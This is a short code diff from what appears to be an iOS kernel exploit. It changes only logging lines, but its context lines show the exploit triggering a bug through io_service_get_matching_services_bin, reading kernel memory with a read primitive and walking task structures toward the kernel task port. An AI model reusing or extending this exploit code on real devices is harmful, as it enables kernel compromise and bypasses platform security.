@@ -411,8 +411,7 @@ val; \
     
     /* trigger the bug */
     err = io_service_get_matching_services_bin(master, data, bufpos, &res);
-    LOG("io_service_get_matching_services_bin: %x", err);
-    
+    LOG("io_service_get_matching_services_bin: %s", mach_error_string(err));
     
     
     uint32_t readtest = 0;
@@ -468,7 +467,7 @@ val; \
     // *task_addr = ipc_port_copyout_send(ipc_port_make_send(kernel_task->itk_self), current_task()->itk_space);
     
     uint32_t current_task = exec_current_task();
-    LOG("current_task: " ADDR, current_task);
+    LOG("current_task(): " ADDR, current_task);
     
     uint32_t current_task_itk_space = kread32_prim(current_task + koffset(off_task_itk_space));
     LOG("current_task()->itk_space: " ADDR, current_task_itk_space);
